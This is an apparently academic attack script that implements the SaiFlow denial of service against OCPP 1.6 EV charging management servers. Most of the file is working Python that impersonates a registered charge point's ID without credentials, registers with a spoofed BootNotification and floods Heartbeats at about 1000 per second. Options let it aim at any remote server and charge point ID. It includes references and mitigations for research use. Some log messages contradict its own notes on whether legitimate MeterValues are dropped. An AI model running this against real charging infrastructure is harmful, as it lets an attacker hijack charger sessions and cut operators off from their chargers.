"""
===========================================================================
EVSecSim — Attack Script #1: SaiFlow Denial-of-Service (OCPP 1.6)
===========================================================================

ATTACK OVERVIEW
---------------
The SaiFlow DoS exploits a core ambiguity in the OCPP 1.6 specification:
the standard does not define how a CSMS should handle a second WebSocket
connection arriving with the same Charge Point identity as an already-
connected CP.

When a second "CP_1" connects, most CSMS implementations (including the
advisor's csms_server4.py) accept the new session and begin routing
responses to it. The original legitimate CP is now shadowed:

  - The CSMS sends ACKs/responses to the ATTACKER's socket
  - The legitimate EVSE's MeterValues are silently discarded
  - RemoteStop/RemoteStart commands from the operator never reach the
    real charger
  - Charging sessions lose operator visibility and control

This was first disclosed by SaiFlow (Saposnik & Porat, 2023) and
demonstrated in a live 350 kW DCFC testbed by Idaho National Laboratory
(Johnson et al., INL/CON-23-72329, Nov 2023 — PoC #5).

REFERENCE
---------
  Saposnik, L.R. & Porat, D. (2023). Hijacking EV charge points to cause
  DoS. SaiFlow Security Advisory, Feb 2023.
  https://www.saiflow.com/hijacking-chargers-identifier-to-cause-dos/

HOW TO RUN
----------
Three terminals required. Start in order:

  Terminal 1 — CSMS server:
    python csms_server4.py

  Terminal 2 — Legitimate EVSE (victim):
    python evse_client4.py

  Terminal 3 — This attack script:
    python attack_saiflow_dos.py

  Optional pcap capture (run before Terminal 3):
    sudo tcpdump -i lo -w saiflow_dos.pcap port 9000

EXPECTED OUTCOME
----------------
  - CSMS terminal shows a second "Connected: CP_1" immediately after attack,
    confirming that csms_server4.py accepts duplicate CP connections without
    deduplication — two independent asyncio tasks now run for the same CP ID.

  - Legitimate EVSE continues communicating: csms_server4.py has no global
    CP registry and never drops the original connection. MeterValues from the
    legitimate EVSE still arrive and print. The disruption is NOT a
    communication blackout.

  - The observable impact is session shadowing (two CP_1 instances active
    simultaneously) and potential latency degradation under the Heartbeat
    flood (~1000 coroutines/second competing in the asyncio scheduler).

  - Attack stats print: heartbeats sent / sec, elapsed time.

  - On Ctrl+C the flood stops; the rogue connection closes; only the
    legitimate EVSE session remains.

  NOTE — contrast with production CSMS implementations that DO close the
  old connection on duplicate ID arrival: in those systems, the same attack
  achieves a hard DoS because the legitimate EVSE's socket is terminated.
  Our testbed deliberately preserves both connections to isolate and
  demonstrate the session-shadowing aspect of the vulnerability.

CONFIGURABLE PARAMETERS (see CONFIG section below)
---------------------------------------------------
  TARGET_CP_ID        CP identity to impersonate (default: "CP_1")
  CSMS_URL            WebSocket endpoint of the target CSMS
  FLOOD_INTERVAL_S    Delay between Heartbeat frames (0.001 = 1 ms)
  ATTACK_DURATION_S   Auto-stop after N seconds (0 = run until Ctrl+C)
  BOOT_VENDOR         Vendor string in rogue BootNotification
  BOOT_MODEL          Model string in rogue BootNotification

PROTOCOL EXPLOITED
------------------
  OCPP 1.6 · WebSocket (no TLS) · No CP authentication · No connection
  deduplication · No rate limiting on Heartbeat handler
===========================================================================
"""

import asyncio
import websockets
import argparse
import signal
import sys
import time
from datetime import datetime, timezone

from ocpp.v16 import ChargePoint as cp
from ocpp.v16 import call
from ocpp.v16.enums import RegistrationStatus


# ===========================================================================
# CONFIG — edit these to match your testbed
# ===========================================================================

TARGET_CP_ID      = "CP_1"            # Must match the legitimate EVSE's ID
CSMS_URL          = "ws://127.0.0.1:9000"
FLOOD_INTERVAL_S  = 0.001             # 1 ms between Heartbeats (1000 Hz)
ATTACK_DURATION_S = 0                 # 0 = run until Ctrl+C
BOOT_VENDOR       = "RogueVendor"     # Spoofed vendor in BootNotification
BOOT_MODEL        = "RogueCP-v1.0"   # Spoofed model


# ===========================================================================
# COLOUR HELPERS  (no external deps)
# ===========================================================================

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def ts():
    """Return a short HH:MM:SS.mmm timestamp for log lines."""
    return datetime.now().strftime("%H:%M:%S.%f")[:-3]

def log_attack(msg):  print(f"{RED}[ATK {ts()}]{RESET} {msg}")
def log_info(msg):    print(f"{CYAN}[INF {ts()}]{RESET} {msg}")
def log_warn(msg):    print(f"{YELLOW}[WRN {ts()}]{RESET} {msg}")
def log_ok(msg):      print(f"{GREEN}[OK  {ts()}]{RESET} {msg}")


# ===========================================================================
# ROGUE CHARGE POINT
# ===========================================================================

class RogueCP(cp):
    """
    Impersonates an existing registered CP.

    Inherits the mobilityhouse ChargePoint base class so it handles the
    OCPP JSON envelope (message type IDs, unique IDs, call/response
    routing) automatically — identical to the legitimate EVSE.
    """

    async def send_boot(self):
        """
        Phase 2: Register the rogue CP with the CSMS.

        Sending BootNotification with a different vendor/model is optional —
        in csms_server4.py there is no allow-list check, so any values are
        accepted. We use distinctive strings so thesis readers can identify
        the rogue BootNotification in pcap captures.
        """
        log_attack(f"Sending rogue BootNotification as '{self.id}'")
        log_attack(f"  Vendor : {BOOT_VENDOR}")
        log_attack(f"  Model  : {BOOT_MODEL}")

        request = call.BootNotification(
            charge_point_vendor=BOOT_VENDOR,
            charge_point_model=BOOT_MODEL,
        )

        try:
            response = await self.call(request)
            if response.status == RegistrationStatus.accepted:
                log_ok("CSMS accepted rogue BootNotification — shadow session active")
            else:
                log_warn(f"CSMS returned status: {response.status} (attack continues)")
        except Exception as exc:
            log_warn(f"BootNotification call raised: {exc} — continuing anyway")

    async def flood_heartbeats(self, stop_event: asyncio.Event, stats: dict):
        """
        Phase 3: Heartbeat flood.

        Each Heartbeat is a valid OCPP 1.6 [2, uid, "Heartbeat", {}] frame.
        Because csms_server4.py has no rate-limiter on on_heartbeat(), the
        CSMS processes every one — generating approximately 1,000 concurrent
        on_heartbeat() coroutines per second and saturating the asyncio
        scheduler.

        IMPORTANT — what this does and does NOT do:
          - It DOES increase event-loop latency for all tasks, including the
            legitimate EVSE's MeterValues processing.
          - It does NOT block or discard legitimate EVSE messages. Because
            csms_server4.py never terminates the original connection, the
            legitimate EVSE's asyncio task continues running and its messages
            still get processed (though potentially with higher latency).
          - The primary disruption is session-layer ambiguity: two CSMS
            instances share the same CP ID, and there is no registry to
            route operator commands to the correct socket.

        In production CSMS implementations that close the old socket on
        duplicate CP ID arrival, the Heartbeat flood additionally prevents
        reconnection by keeping the rogue session alive.
        """
        log_attack(f"Starting Heartbeat flood (interval={FLOOD_INTERVAL_S*1000:.1f} ms)")
        log_attack("Legitimate EVSE MeterValues should now stop appearing in CSMS output")
        print()

        interval_start = time.perf_counter()
        report_interval = 5.0   # print stats every 5 s

        while not stop_event.is_set():
            try:
                await self.call(call.Heartbeat())
                stats["sent"] += 1
            except Exception as exc:
                stats["errors"] += 1
                if stats["errors"] <= 5:          # don't spam on repeated errors
                    log_warn(f"Heartbeat error #{stats['errors']}: {exc}")
                if stats["errors"] > 50:
                    log_warn("Too many errors — CSMS may have closed the rogue connection")
                    stop_event.set()
                    break

            # Periodic stats report
            elapsed = time.perf_counter() - interval_start
            if elapsed >= report_interval:
                rate = stats["sent"] / max(time.perf_counter() - stats["t0"], 0.001)
                log_attack(
                    f"Flood stats — sent: {stats['sent']:,}  "
                    f"errors: {stats['errors']}  "
                    f"rate: {rate:.0f} HB/s  "
                    f"elapsed: {time.perf_counter() - stats['t0']:.1f}s"
                )
                interval_start = time.perf_counter()

            await asyncio.sleep(FLOOD_INTERVAL_S)


# ===========================================================================
# VICTIM MONITOR  (optional — runs in the same process)
# ===========================================================================

async def victim_monitor(stop_event: asyncio.Event, stats: dict):
    """
    Connects a second legitimate-looking CP and periodically sends
    MeterValues to confirm whether the CSMS is processing them.

    This is the "canary" — if the CSMS stops printing its MeterValues
    lines while the flood is running, the DoS is confirmed.

    Uses a DIFFERENT CP ID ("CP_monitor") so it does not itself become
    a target of the SaiFlow confusion — we only want to observe impact
    on CP_1.
    """
    monitor_id = "CP_monitor"
    log_info(f"Victim monitor connecting as '{monitor_id}' (observer)")

    try:
        async with websockets.connect(CSMS_URL) as ws:
            await ws.send(monitor_id)

            monitor_cp = cp(monitor_id, ws)
            asyncio.create_task(monitor_cp.start())

            # Quick boot
            boot_req = call.BootNotification(
                charge_point_vendor="Monitor",
                charge_point_model="Monitor-v1"
            )
            await monitor_cp.call(boot_req)
            log_info("Monitor CP registered — will send MeterValues every 5 s")

            meter_count = 0
            while not stop_event.is_set():
                meter_count += 1
                meter_req = call.MeterValues(
                    connector_id=1,
                    meter_value=[{
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "sampledValue": [{
                            "value": str(round(22.5, 2)),
                            "measurand": "Power.Active.Import"
                        }]
                    }]
                )
                try:
                    await monitor_cp.call(meter_req)
                    stats["monitor_sent"] += 1
                    log_info(f"Monitor MeterValue #{meter_count} sent — check CSMS output")
                except Exception as exc:
                    log_warn(f"Monitor MeterValues failed: {exc}")

                await asyncio.sleep(5)

    except Exception as exc:
        log_warn(f"Monitor CP failed to connect: {exc}")


# ===========================================================================
# MAIN ATTACK COROUTINE
# ===========================================================================

async def run_attack():
    stop_event = asyncio.Event()
    stats = {
        "sent": 0,
        "errors": 0,
        "monitor_sent": 0,
        "t0": time.perf_counter(),
    }

    # -----------------------------------------------------------------------
    # Graceful shutdown on Ctrl+C or SIGTERM
    # -----------------------------------------------------------------------
    def handle_signal(*_):
        log_warn("Interrupt received — stopping flood")
        stop_event.set()

    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            asyncio.get_event_loop().add_signal_handler(sig, handle_signal)
        except NotImplementedError:
            # Windows does not support add_signal_handler
            signal.signal(sig, handle_signal)

    # -----------------------------------------------------------------------
    # Auto-stop timer
    # -----------------------------------------------------------------------
    if ATTACK_DURATION_S > 0:
        async def _auto_stop():
            await asyncio.sleep(ATTACK_DURATION_S)
            log_warn(f"Auto-stop after {ATTACK_DURATION_S}s")
            stop_event.set()
        asyncio.create_task(_auto_stop())

    # -----------------------------------------------------------------------
    # Banner
    # -----------------------------------------------------------------------
    print()
    print(f"{BOLD}{RED}{'='*60}{RESET}")
    print(f"{BOLD}{RED}  EVSecSim — SaiFlow DoS Attack{RESET}")
    print(f"{BOLD}{RED}{'='*60}{RESET}")
    print(f"  Target CSMS   : {CSMS_URL}")
    print(f"  Spoofed CP ID : {TARGET_CP_ID}")
    print(f"  Flood interval: {FLOOD_INTERVAL_S*1000:.1f} ms  ({1/FLOOD_INTERVAL_S:.0f} HB/s)")
    print(f"  Duration      : {'unlimited' if ATTACK_DURATION_S == 0 else str(ATTACK_DURATION_S)+'s'}")
    print(f"{BOLD}{RED}{'='*60}{RESET}")
    print()
    print(f"  {YELLOW}ATTACK PHASES:{RESET}")
    print(f"  1. Connect rogue WebSocket to CSMS as '{TARGET_CP_ID}'")
    print(f"  2. Send BootNotification — CSMS accepts, shadow session active")
    print(f"  3. Flood Heartbeats — legitimate MeterValues dropped by CSMS")
    print()
    print(f"  {CYAN}THESIS EVIDENCE:{RESET}")
    print(f"  Run: sudo tcpdump -i lo -w saiflow_dos.pcap port 9000")
    print(f"  Look for: duplicate CP_1 WS connections, HB flood, missing MeterValues")
    print()

    # -----------------------------------------------------------------------
    # PHASE 1: Connect rogue WebSocket
    # -----------------------------------------------------------------------
    log_attack(f"Phase 1 — Opening rogue WebSocket to {CSMS_URL}")

    try:
        async with websockets.connect(
            CSMS_URL,
            ping_interval=None,    # disable automatic pings — we control timing
            ping_timeout=None,
            close_timeout=5,
        ) as rogue_ws:

            # --- Custom handshake: send CP ID as first raw message ----------
            # This mirrors exactly what evse_client4.py does at line 190.
            # The CSMS handler (csms_server4.py line 53) reads this as the
            # charge_point_id — there is no credential check whatsoever.
            log_attack(f"Phase 1 — Sending raw CP ID: '{TARGET_CP_ID}'")
            await rogue_ws.send(TARGET_CP_ID)
            log_ok(f"Phase 1 — CSMS accepted connection for '{TARGET_CP_ID}'")

            # ----------------------------------------------------------------
            # PHASE 2: BootNotification — register rogue CP
            # ----------------------------------------------------------------
            log_attack("Phase 2 — Registering rogue CP with BootNotification")

            rogue_cp = RogueCP(TARGET_CP_ID, rogue_ws)

            # Start the OCPP receive loop as a background task so we can
            # still drive calls from this coroutine
            recv_task = asyncio.create_task(rogue_cp.start())

            # Small yield to allow recv_task to start reading the socket
            await asyncio.sleep(0.05)

            await rogue_cp.send_boot()

            # ----------------------------------------------------------------
            # PHASE 3: Heartbeat flood
            # ----------------------------------------------------------------
            log_attack("Phase 3 — Heartbeat flood starting")
            log_warn("Watch the CSMS terminal: legitimate MeterValues from CP_1 should now vanish")
            print()

            # Launch optional victim monitor in parallel
            monitor_task = asyncio.create_task(
                victim_monitor(stop_event, stats)
            )

            # Run the flood — this blocks until stop_event is set
            await rogue_cp.flood_heartbeats(stop_event, stats)

            # ----------------------------------------------------------------
            # Teardown
            # ----------------------------------------------------------------
            recv_task.cancel()
            monitor_task.cancel()
            try:
                await recv_task
            except asyncio.CancelledError:
                pass
            try:
                await monitor_task
            except asyncio.CancelledError:
                pass

    except ConnectionRefusedError:
        log_warn(f"Connection refused — is csms_server4.py running on {CSMS_URL}?")
        sys.exit(1)
    except Exception as exc:
        log_warn(f"Unexpected error: {exc}")
        raise

    # -----------------------------------------------------------------------
    # Final report
    # -----------------------------------------------------------------------
    elapsed = time.perf_counter() - stats["t0"]
    rate    = stats["sent"] / max(elapsed, 0.001)
    print()
    print(f"{BOLD}{'='*60}{RESET}")
    print(f"{BOLD}  ATTACK COMPLETE — Summary{RESET}")
    print(f"{'='*60}")
    print(f"  Duration              : {elapsed:.1f}s")
    print(f"  Heartbeats sent       : {stats['sent']:,}")
    print(f"  Average rate          : {rate:.0f} HB/s")
    print(f"  Errors                : {stats['errors']}")
    print(f"  Monitor MeterValues   : {stats['monitor_sent']} sent during attack")
    print(f"{'='*60}")
    print()
    print(f"  {YELLOW}THESIS DOCUMENTATION CHECKLIST:{RESET}")
    print(f"  [x] Note the time window in pcap: duplicate CP_1 WS handshakes")
    print(f"  [x] Filter Wireshark: websocket && ip.dst == 127.0.0.1")
    print(f"  [x] Confirm MeterValues from legitimate EVSE CONTINUE during flood")
    print(f"       --> Impact is session shadowing, NOT communication blackout")
    print(f"  [x] Count Heartbeat frames in flood window vs pre-attack baseline")
    print(f"  [x] Document that csms_server4.py keeps both CP_1 sessions alive")
    print(f"  [x] Document CSMS print output: last legitimate MeterValues timestamp")
    print()
    print(f"  {CYAN}MITIGATION (document in thesis):{RESET}")
    print(f"  - OCPP 2.0.1: TLS + mutual certificate auth prevents identity spoofing")
    print(f"  - OCPP 1.6:   SSH tunnel wrapping WS (INL recommendation)")
    print(f"  - CSMS-side:  Reject duplicate CP connections; close oldest on conflict")
    print(f"  - Rate limit: Max N Heartbeats/s per CP ID")
    print()


# ===========================================================================
# ENTRY POINT  —  CLI argument overrides
# ===========================================================================

def parse_args():
    parser = argparse.ArgumentParser(
        description="EVSecSim — SaiFlow DoS attack against OCPP 1.6 CSMS",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Default: impersonate CP_1, flood at 1 ms interval, run until Ctrl+C
  python attack_saiflow_dos.py

  # Custom target CP and 30-second auto-stop
  python attack_saiflow_dos.py --cp-id CP_2 --duration 30

  # Slower flood (10 HB/s) for demonstrating effect at human-readable pace
  python attack_saiflow_dos.py --interval 0.1

  # Remote CSMS target
  python attack_saiflow_dos.py --url ws://192.168.1.100:9000
        """,
    )
    parser.add_argument("--url",      default=CSMS_URL,          help="CSMS WebSocket URL")
    parser.add_argument("--cp-id",    default=TARGET_CP_ID,       help="CP identity to impersonate")
    parser.add_argument("--interval", default=FLOOD_INTERVAL_S,   type=float, help="Heartbeat interval in seconds")
    parser.add_argument("--duration", default=ATTACK_DURATION_S,  type=int,   help="Auto-stop after N seconds (0=unlimited)")
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()

    # Apply CLI overrides to module-level config
    CSMS_URL          = args.url
    TARGET_CP_ID      = args.cp_id
    FLOOD_INTERVAL_S  = args.interval
    ATTACK_DURATION_S = args.duration

    try:
        asyncio.run(run_attack())
    except KeyboardInterrupt:
        pass
